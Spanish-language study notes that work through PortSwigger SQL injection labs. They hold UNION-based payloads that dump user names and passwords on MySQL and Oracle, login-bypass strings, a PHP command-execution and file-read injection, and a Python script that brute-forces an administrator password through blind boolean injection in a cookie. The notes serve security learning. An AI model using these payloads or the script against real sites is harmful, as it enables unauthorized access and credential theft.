SQLi


#### #### SQL injection vulnerability in WHERE clause allowing retrieval of hidden data #### #### 
Existen páginas web que "por detrás" existe una base de datos. Al estar navegando por ella y hacer un input, lo que va a hacer es una query a esa base de datos
para mostrarte información o para logearte. Por ejemplo, en una tienda online, si haces click a un producto que tengan la query se puede parecer a: 

SELECT * FROM productos where categoria = ' Teclados ' and stock = 1

http://www.tiendafalsa.com/carrito?productos?categoria=teclados

De toda esa tabla te va a seleccionar solo las filas que tienen en su categoria teclados y que están en stock. Un ejemplo de inyección sería, modificando la query anterior:

http://www.tiendafalsa.com/carrito?categoria=teclados' OR 1=1-- 
SELECT * FROM productos where categoria = ' Teclados ' OR 1=1'-- and stock = 1

Aquí lo que está ocurriendo es que como 1=1 siempre va a ser verdad, todas las filas cumplirian la condición del WHERE, por lo que nos mostraría toda la información 
de la tabla productos. 





#### #### SQL injection vulnerability allowing login bypass #### #### 
En páginas de log in una query puede ser algo como:

SELECT nombre FROM usuarios WHERE user = ' ' and password = ' ';

Si en el input del usuario, ponemos administrador o alguna cuenta que sepamos que tenga privilegios, podemos conseguir evitar que compruebe la contraseña:

SELECT nombre FROM usuarios WHERE user = 'administrator'-- ' password = ' '; 
quedaría asi -> SELECT nombre FROM usuarios WHERE user = 'administrator' pues el comentario hace que no compruebe contraseña. 





#### #### SQL injection UNION attack, determining the number of columns returned by the query #### #### 
Determinar el número de columnas es muy importante a la hora de intentar inyectar código. Si volvemos a los ejemplos anteriores:

SELECT * FROM productos where categoria = ' Teclados ' and stock = 1
http://www.tiendafalsa.com/carrito?productos?categoria=teclados

Podemos probar introduciendo:

http://www.tiendafalsa.com/carrito?productos?categoria=teclados'ORDER BY n-- - -> siendo n un int para determinar las columnas.

http://www.tiendafalsa.com/carrito?productos?categoria=teclados'UNION SELECT 1,2,3-- -
http://www.tiendafalsa.com/carrito?productos?categoria=teclados'UNION SELECT NULL,NULL,NULL-- -
http://www.tiendafalsa.com/carrito?productos?categoria=teclados'UNION SELECT version(),NULL,NULL-- -
http://www.tiendafalsa.com/carrito?productos?categoria=teclados'UNION SELECT <?php system('whoami');?>,NULL,NULL-- -
http://www.tiendafalsa.com/carrito?productos?categoria=teclados'UNION SELECT load_file("/etc/hosts"),NULL,NULL-- -





#### #### SQL injection UNION attack, finding a column containing text #### #### 
http://www.tiendafalsa.com/carrito?productos?categoria=teclados'UNION SELECT NULL,'textointroducido',NULL-- -



#### #### SQL injection UNION attack, retrieving data from other tables #### #### 
http://www.tiendafalsa.com/carrito?productos?categoria=teclados'UNION group_concat(schema_name),NULL from information_schema.schemata-- -   -> listar database
http://www.tiendafalsa.com/carrito?productos?categoria=teclados'UNION table_name,NULL from information_schema.tables-- -                    -> listar tablas

http://www.tiendafalsa.com/carrito?productos?categoria=teclados'UNION table_name,NULL from information_schema.tables WHERE table_schema='DB'-- -

http://www.tiendafalsa.com/carrito?productos?categoria=teclados'UNION column_name,NULL from information_schema.columns WHERE table_schema='DB' and table_name='table'-- -

union select group_concat(username,':',password) from users-- - o ||':'|| para concatenar







#### #### Lab: SQL injection UNION attack, retrieving multiple values in a single column #### #### 
union select group_concat(username,':',password) from users-- - o ||':'|| para concatenar







#### #### ORACLE #### ####
  #### #### SQL injection attack, querying the database type and version on Oracle #### #### 

https://0aed0078030997ae804821a900e8009a.web-security-academy.net/filter?category=Accessories%27union%20select%20null,banner%20from%20v$version--%20-
' UNION SELECT null, banner from v$version-- -

  #### #### SQL injection attack, listing the database contents on Oracle #### ####

https://0a8f00db03485f28805912a0004700ba.web-security-academy.net/filter?category=Pets%27%20UNION%20SELECT%20NULL,NULL%20from%20dual--%20-
' UNION SELECT NULL,NUL from dual-- -
https://0a8f00db03485f28805912a0004700ba.web-security-academy.net/filter?category=Pets%27%20UNION%20SELECT%20NULL,table_name%20from%20all_tables--%20-
' UNION SELECT NULL,table_name from all_tables-- -
https://0a8f00db03485f28805912a0004700ba.web-security-academy.net/filter?category=Pets%27%20UNION%20SELECT%20NULL,column_name%20from%20all_tab_columns%20where%20table_name=%27USERS_HANNJE%27--%20-
' UNION SELECT NULL,column_name from all_tab_columns where table_name='USERS_HANNJE'-- -
https://0a5e000e04c13152803617b90013008e.web-security-academy.net/filter?category=Pets%27%20union%20select%20null,username||%27:%27||password%20from%20users--%20-
' union select null,username||':'||password from users-- -
https://0a8f00db03485f28805912a0004700ba.web-security-academy.net/filter?category=Pets%27%20union%20select%20NULL,USERNAME_TZEWHC||%27:%27||PASSWORD_XAJTIK%20from%20USERS_HANNJE--%20-
' union select NULL,USERNAME_TZEWHC||':'||PASSWORD_XAJTIK from USERS_HANNJE-- -







  
#### #### SQL #### ####
    #### #### SQL injection attack, querying the database type and version on MySQL and Microsoft #### #### 

https://0aef004e03ab30ae81d9a2b900770090.web-security-academy.net/filter?category=Gifts%27%20union%20select%20null,@@version--%20-
' UNION SELECT null, @@version-- -


    #### #### SQL injection attack, listing the database contents on non-Oracle databases #### #### 


https://0a1100510486b06c81d116f4001a0046.web-security-academy.net/filter?category=Pets%27%20union%20select%20NULL,column_name%20from%20information_schema.columns%20where%20table_schema=%27public%27%20and%20table_name=%27users_qmoism%27--%20-
https://0a1100510486b06c81d116f4001a0046.web-security-academy.net/filter?category=Pets%27%20UNION%20select%20NULL,password_sfzjvs||%27:%27||username_hvkxom%20from%20public.users_qmoism--%20-

' UNION SELECT NULL, username_hvkxom||':'||password_sfzjvs from users_qmoism









 ####  #### Blind SQL injection with conditional responses ####  #### 

Este es un tipo de inyeccion a ciegas porque no ves el error que te da. En PortSwigger te avisan del parametro TrachingId que es vulnerable y un mensaje de "Welcome Back!"
en la web (que supongo que será la ID de la sesión iniciada en la web)

Cuando la cookie esta:

TrackingId=q8JZjDAPSH5UYtS9 --> aparece welcome back
TrackingId=q8JZjDAPSH5UYtS9' --> no aparece welcome back
TrackingId=q8JZjDAPSH5UYtS9'-- - --> aparece welcome back
TrackingId=q8JZjDAPSH5UYtS9' AND 1=1-- - --> aparece welcome back
TrackingId=q8JZjDAPSH5UYtS9' AND 2=1-- - --> NO aparece welcome back

TrackingId=q8JZjDAPSH5UYtS9' and (select 'a' from users limit 1) = 'a'-- -   --> aparece welcome back


>> Comprobar que existe una tabla
TrackingId=q8JZjDAPSH5UYtS9' and (select 'a' from dusers limit 1) = 'a'-- - --> NO aparece welcome back
TrackingId=q8JZjDAPSH5UYtS9' and (select 'a' from users limit 1) = 'a'-- - --> aparece welcome back
>> Averiguar longitud de la contraseña 
TrackingId=q8JZjDAPSH5UYtS9' and (select 'a' from users where username='administrator' and length(password)=20) = 'a'-- -

############################# SCRIPT ITERACIÓN CONTRASEÑA ##########################################
#!/usr/bin/python3

from pwn import *
import requests, signal, time, pdb, sys, string

def def_handler(sig, frame):
        print("[!] Saliendo...\n")
        sys.exit(1)

signal.signal(signal.SIGINT, def_handler)
main_url = "https://0ac6001c0327ef7d80e32b0800fb006d.web-security-academy.net"
characters = string.ascii_lowercase + string.digits


def makeRequest():
        password = ""

        p1 = log.progress("Fuerza bruta")
        p1.status("Iniciando ataque de fuerza bruta")

        time.sleep(2)
        p2 = log.progress("Password")

        for position in range(1,21):
                for character in characters:
                        cookies = {
                        'TrackingId' : "q8JZjDAPSH5UYtS9' and (select substring(password,%d,1) from users where username='administrator')='%s" % (position,character),
                        'session' : "ZogtQ3wSKyrO1itrib965BerXVKJLpZe"
                        }
                        p1.status(cookies['TrackingId'])
                        r = requests.get(main_url, cookies=cookies)

                        if "Welcome back!" in r.text:
                                password += character
                                p2.status(password)
                                break

if __name__ == '__main__':
        makeRequest()

########################################################################################################################################################################






https://www.youtube.com/watch?v=C-FiImhUviM













